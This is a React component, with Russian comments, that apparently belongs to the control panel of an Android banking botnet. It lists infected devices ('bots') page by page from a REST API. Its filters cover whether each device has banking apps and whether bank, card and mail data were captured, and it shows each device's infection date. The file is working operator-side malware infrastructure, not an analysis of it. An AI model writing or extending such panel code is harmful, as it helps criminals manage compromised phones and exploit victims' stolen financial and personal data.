import React from 'react';
import BotsTbody from './BotsTbody';
import SettingsContext from './../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

// Кнопочки листания страниц.
// TODO: Сделать норм генрацию кнопок
function GetPageItem(i, currentPage, onLoadJson) {
    if(i==currentPage) {
        return (
            <li class="page-item active"><span class="page-link">{i}<span class="sr-only">(current)</span></span></li>
        );
    }
    else {
        return (
            <li class="page-item"><a class="page-link" onClick={() => onLoadJson(i)} pageId={i}>{i}</a></li>
        );
    }
}

class BotsTable extends React.Component {
    
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          pages: 1,
          botslist: [],
          currentPage: 1
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }
    
    componentDidMount() {
        this.onLoadJson(1);
    }

    autoUpdate() {
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(this.state.currentPage), SettingsContext.autoUpdateDelay);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson(this.state.currentPage);
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }
    /**'{"request":"getBots","currentPage":"1","sorting":"0101010"}'   // это с сортировкой (sorting) Пример

     0 - false    1-true

    1 - online
    2 - offline
    3 - dead
    4 - Exist App Banks
    5 - No Exist App Banks
    6 - statBank==1
    7 - statCC==1
    8 - statMail==1
    */

    onLoadJson (currState) {
        this.DisableTimer();

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"request":"getBots","currentPage":"' + currState +
                    '","sorting":"' + SettingsContext.BotsFilterMode + 
                    '","botsperpage":"' + SettingsContext.BotsPerPage + 
                    '"}'
                ).toString('base64')
            }
        });

        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        pages: result.pages,
                        botslist: result.bots,
                        currentPage: result.currentPage
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading bots table. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        this.autoUpdate();
    }

    render () {
        const { error, isLoaded, pages, botslist, currentPage } = this.state;
        if (error) {
            return <div>Error: {error}</div>;
        }
        else if (!isLoaded) {
            return <div class="loading">Loading</div>;
        }
        else {
            var pageElements = [];
            for (var i = 1; i <= pages; i++)
            {
                pageElements.push(GetPageItem(i, currentPage, this.onLoadJson.bind(this)));
            }

            const tdw = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '31px',
                width: '55px'
            }

            const IconsClass = {
                width: '100px'
            }

            SettingsContext.BotsOnPage = [];

            botslist.forEach(bott => {
                SettingsContext.BotsOnPage.push(bott.id);
            });

            return (
                <React.Fragment>
                    <table class="mainbottable table table-striped table-dark table-hover ">
                        <thead>
                            <tr>
                            <th scope="col" style={({width:'20%'})}>ID</th>
                            <th scope="col" style={tdw}><i class="fab fa-android"></i></th>
                            <th scope="col" style={tdw}><i class="fal fa-tags"></i></th>
                            <th scope="col" style={tdw}><i class="fal fa-flag-checkered"></i></th>
                            <th scope="col" style={tdw}><i class="far fa-stopwatch"></i></th>
                            <th scope="col" style={IconsClass}></th>
                            <th scope="col" style={({width:'70px'})}></th>
                            <th scope="col" style={tdw}><i class="far fa-chart-network"></i></th>
                            <th scope="col" style={({textAlign:'center', width:'140px'})}>Date infection</th>
                            <th scope="col">Comment</th>
                            <th scope="col"></th>
                            <th scope="col"></th>
                            </tr>
                        </thead>
                        <BotsTbody BotListForceUpdate={this.props.BotListForceUpdate} botList={botslist} />
                    </table>
                    <nav>
                    <ul class="pagination justify-content-center">
                        {pageElements}
                    </ul>
                    </nav>
                </React.Fragment>
            );
        }
    }
}

export default BotsTable;